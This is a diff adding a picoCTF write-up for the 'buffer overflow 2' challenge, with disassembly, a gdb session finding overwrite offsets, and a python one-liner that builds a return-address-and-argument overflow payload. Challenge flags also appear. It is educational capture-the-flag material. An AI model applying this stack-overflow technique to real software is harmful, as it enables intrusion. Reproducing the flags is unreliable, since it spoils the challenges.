@@ -61,6 +61,7 @@ Ext Super Magic              Forensics        250
 Lying Out                    Forensics        250     picoCTF{w4y_0ut_ff5bd19c}
 The Vault                    Web              250     picoCTF{w3lc0m3_t0_th3_vau1t_e4ca2258}
 absolutely relative          General Skills   250
+buffer overflow 2            Binary Exploit   250
 caesar cipher 2              Cryptography     250
 got-2-learn-libc             Binary Exploit   250
 rsa-madlibs                  Cryptography     250
@@ -1921,6 +1922,91 @@ picoCTF{3v3r1ng_1$_r3l3t1v3_a97be50e}
 ```
 picoCTF{3v3r1ng_1$_r3l3t1v3_a97be50e}
 ```
+
+##  Binary Exploitation 250: buffer overflow 2
+
+**Challenge**
+ Alright, this time you'll need to control some arguments. Can you get the flag from this program? You can find it in /problems/buffer-overflow-2_2_46efeb3c5734b3787811f1d377efbefa on the shell server. [Source.](./writeupfiles/vuln-buff-overflow-2.c)
+
+**Solution**
+The hint suggests
+
+> Try using gdb to print out the stack once you write to it!
+
+Which is useful. First attempted to find out what was necessary to overwrite the return pointer and segfault, '107 * a' was just before there. Opened up gdb:
+
+Looking at the dump of vuln, it is suggested to me that we should want to control ebp (to be `0xdeadbeefdeadcode`) + the return (to be `0x080485cb`)
+
+```
+080485cb <win>:
+ ...
+ 804861d:       81 7d 08 ef be ad de    cmpl   $0xdeadbeef,0x8(%ebp)
+ 8048624:       75 1a                   jne    8048640 <win+0x75>
+ 8048626:       81 7d 0c de c0 ad de    cmpl   $0xdeadc0de,0xc(%ebp)
+ 804862d:       75 14                   jne    8048643 <win+0x78>
+```
+
+After much experimentation remembered how metasploit does it, by inserting the alphabet and mapping that back to points that are interesting to control.
+
+```
+$ gdb vuln
+...
+(gdb) break vuln
+Breakpoint 1 at 0x804864c
+(gdb) break win
+Breakpoint 2 at 0x80485d1
+(gdb) run
+Starting program: /problems/buffer-overflow-2_2_46efeb3c5734b3787811f1d377efbefa/vuln
+Please enter your string:
+
+Breakpoint 1, 0x0804864c in vuln ()
+(gdb) step
+Single stepping until exit from function vuln,
+which has no line number information.
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabcdefghijklmnopqrstuvwxyz
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabcdefghijklmnopqrstuvwxyz
+Warning:
+Cannot insert breakpoint 0.
+Cannot access memory at address 0x73727170
+
+0x6f6e6d6c in ?? ()
+```
+
+Ok, so in this string:
+
+```
+<snip>bcdefghijklmnopqrstuvwxyz
+                \||/\||/
+             0x6c-6f ||
+                    ^^^^
+                 0x70-73
+```
+
+So we write garbage up to `j` and end at `t`. positions `l`-`o` are where it will return to, and positions `p`-`s` need deadbeef/deadcode.
+
+```
+python -c "print('a' * 112 + '\xcb\x85\x04\x08\xef\xbe\xad\xde\xde\xc0\xad\xde')"  > ~/ffff
+$ gdb vuln
+...
+(gdb) run < ~/ffff
+Starting program: /problems/buffer-overflow-2_2_46efeb3c5734b3787811f1d377efbefa/vuln < ~/ffff
+Please enter your string:
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaﾭ
+Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.
+[Inferior 1 (process 1486044) exited normally]
+```
+
+So that works perfectly (in that it complains of a missing flag, it successfully entered the `win` function.) However running the same thing outside of gdb, fails:
+
+```
+$ ./vuln < ~/ffff
+Please enter your string:
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaﾭ
+Segmentation fault
+```
+
+Which is quite unexpected.
+
 
 ## Cryptography 250: caesar cipher 2
 
